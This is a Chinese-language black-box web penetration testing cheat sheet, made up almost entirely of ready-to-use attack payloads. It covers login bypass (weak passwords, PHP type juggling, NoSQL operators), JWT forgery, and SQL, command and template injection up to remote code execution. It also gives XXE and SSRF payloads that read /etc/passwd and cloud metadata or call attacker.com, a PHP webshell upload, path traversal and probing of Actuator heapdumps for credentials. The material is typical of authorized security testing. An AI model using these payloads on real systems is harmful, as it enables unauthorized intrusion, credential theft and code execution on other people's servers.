# 黑盒测试 Payload 速查

## 1. 认证绕过

### 弱口令字典（优先顺序）
```
admin/admin          admin/admin123       admin/123456
admin/admin888       admin/password       admin/admin@123
test/test            root/root            guest/guest
系统名+123（如 xianyu123 / mars123）
文档/GitHub README 里公示的演示账号 ★
```

### 类型混淆绕过
```
# PHP 弱比较
password=0            # 0 == "任意字符串"
password[]=x          # 数组绕过 strcmp
password=240610708    # MD5 = 0e462097431906509019562988736854
                      # 与 0e 开头的 hash 弱比较相等

# JSON 类型混淆
{"password":true}
{"password":0}
{"password":[]}
{"password":{"$ne":null}}   # NoSQL

# 参数污染
username=admin&username=test
username=admin%00
```

### 验证码绕过
```
# 复用
同一个验证码重复提交
# 空值
captcha=  /  captcha=null  /  删除该参数
# 爆破
数字4位验证码 → 无限尝试（先测是否有次数限制）
# 响应篡改
返回包改 {"success":false} → {"success":true}
# 客户端校验
直接跳过前端JS校验，调后端接口
```

### 前端加密绕过 ★
```
# 定位加密逻辑
grep -rn "JSEncrypt\|RSA\|publicKey\|encrypt" *.js
grep -rn "BEGIN PUBLIC KEY\|MFww\|MIIB" *.js *.html

# RSA 公钥提取（JSEncrypt 格式）
new JSEncrypt(); setPublicKey("MFww...")

# 若配置文件泄露 privateKey → 可直接解密任意请求
# 若无 privateKey → 用公钥加密自己的请求即可（加密仍是合法的）
```

### JWT

**按命中率排序，RS256→HS256 混淆排第一（原版漏了）。**

```
★ ① RS256 → HS256 算法混淆（命中率最高）

原理：服务端用非对称算法验签，但代码信任 JWT header 里的 alg 字段。
      改成 HS256 后，服务端会拿"公钥"当 HMAC 密钥验签。
      而公钥通常公开（前端JS / jwks.json / 证书），攻击者可以自己签。

利用步骤：
  1. 拿到公钥
     - 从前端 JS: grep -oE "MFww[A-Za-z0-9+/=]{20,}"
     - 从 /jwks.json / /.well-known/jwks.json
     - 从 SSL 证书提取
  2. 用公钥当 HMAC 密钥重新签名
     jwt_tool <token> -X k -pk public.pem
  3. 或手工：
     import jwt
     jwt.encode(payload, public_key_pem, algorithm="HS256")

  工具：jwt_tool -M at -np -pk public.pem
        python3 jwt_forgery.py <token> <jwks_url>

★ ② alg:none
  {"alg":"none","typ":"JWT"} → 去掉签名部分（保留末尾的 .）
  变体：none / None / NONE / nOnE（大小写绕过）

★ ③ 弱密钥爆破（HS256）
  hashcat -m 16500 jwt.txt rockyou.txt
  jwt_tool <token> -C -d wordlist.txt
  常见弱密钥：secret / password / changeme / 公司名 / 系统名

④ kid 注入
  {"alg":"HS256","kid":"../../../../dev/null"}      # 空密钥
  {"alg":"HS256","kid":"http://attacker.com/key"}   # 加载外部密钥
  {"kid":"1' UNION SELECT 'attackerkey'--"}         # SQL注入kid
  {"kid":"/proc/sys/kernel/randomize_va_space"}     # 指向已知内容文件

⑤ jku / x5u 注入
  {"jku":"http://attacker.com/jwks.json"}           # 指向自己控制的JWKS

⑥ 其他
  - 篡改 payload 后不重签（服务端漏验签）
  - 过期时间：检查是否真的校验 exp
  - 敏感信息泄露：base64解payload看有无password/内部字段
```


## 2. 注入

### SQL
```
'                          # 报错探测
' OR '1'='1
' OR 1=1--
' AND SLEEP(5)--           # 时间盲注（MySQL）
'; WAITFOR DELAY '0:0:5'--  # SQL Server
'||pg_sleep(5)--            # PostgreSQL

# 布尔盲注
' AND SUBSTRING(database(),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--

# 报错注入
' AND extractvalue(1,concat(0x7e,database()))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--

# 绕过WAF
/**/ 代替空格
+ 代替空格
%09 %0a %0b %0c %0d 代替空格
大小写混写 SeLeCt
双写 UNunionION
```

### 命令注入
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id            # 换行
${IFS}            # 空格绕过
$IFS$9
# 盲注
; sleep 5
; ping -c 5 127.0.0.1
```

### SSTI
```
{{7*7}}              → 49 (Jinja2/Twig)
${7*7}               → 49 (Freemarker/EL)
#{7*7}               → 49 (EL)
<%= 7*7 %>           → 49 (ERB)

# Jinja2 RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate() }}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- 盲XXE + OOB -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<!-- SSRF -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

## 3. 逻辑漏洞

```
# 金额
price=0.01
price=-1
price=1e-10
quantity=-1

# 竞态（并发）
# 用 Turbo Intruder / 自写多线程同时发同一请求
# 场景：优惠券、提现、注册、库存、积分兑换

# 流程绕过
直接访问最终步骤的接口
跳过支付回调，手动调用"支付成功"接口
订单状态机：取消后仍能发货

# 越权
/user?id=1 → 遍历 id
/api/v1/orders/{order_id} → 换成别人的
用低权账号的 token 调高权接口

# 任意用户密码重置
# 只靠 username 就能重置，无 token 校验
# 或 token 可预测 / 从响应泄露
```

## 4. 文件

### 任意文件读取
```
../../../../etc/passwd
../../../../windows/win.ini
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f
....//....//....//
..%252f..%252f          # 双重编码
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

### 文件上传
```
# 后缀绕过
shell.php5  shell.phtml  shell.pht  shell.php7
shell.php.  shell.php%00.jpg  shell.php%20
shell.pHp  shell.PHP
.htaccess（改解析规则）
# Content-Type 绕过
Content-Type: image/jpeg
# 魔术字节
GIF89a<?php system($_GET['c']); ?>
# 竞争上传
上传后立刻访问（先落地后校验的场景）
```

## 5. SSRF

```
url=http://127.0.0.1:8080/admin
url=http://169.254.169.254/latest/meta-data/     # 云元数据
url=http://[::1]:80
url=http://0x7f000001/
url=http://2130706433/
url=http://localhost.attacker.com/               # DNS重绑定
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info
url=gopher://127.0.0.1:6379/_INFO                # 打Redis

# 绕过黑名单
用短网址
URL解析差异（@、#、\）
302跳转
```

## 6. 未授权接口探测

```bash
# 常见路径
/internal/  /debug/  /actuator/  /admin/  /api/v1/sync/
/worker/  /health  /metrics  /env  /config

# Spring Boot Actuator
/actuator/env          → 环境变量（可能含密码）
/actuator/heapdump     → 堆转储（可提取凭据）
/actuator/mappings     → 所有路由
/actuator/beans

# 判据
- 框架文档 security 标注为空 → 必须实测验证
- 实测技巧：不传任何 token 直接请求，看是否返回数据
- 反向验证：故意传错误参数，看错误信息是否泄露内部结构
```

## 7. 响应分析技巧 ★

```
# 响应长度差异 = 逻辑可区分
7342字节 vs 7345字节  → 服务端走了不同分支

# 状态码含义
200 存在且可访问
301/302 存在，可能需认证（看 Location）
401 需认证
403 存在但被拒（可能可绕过）
404 不存在
500 存在但出错（参数不对）

# 错误信息利用
"机器码长度应为32位，当前19位"  → 反推校验规则
"账号密码不能为空"             → 参数名是 account/password
"用户名 密码错误"              → 参数名是 username
"此卡密已超过邮箱验证码最大限制" → 存在配额逻辑
```
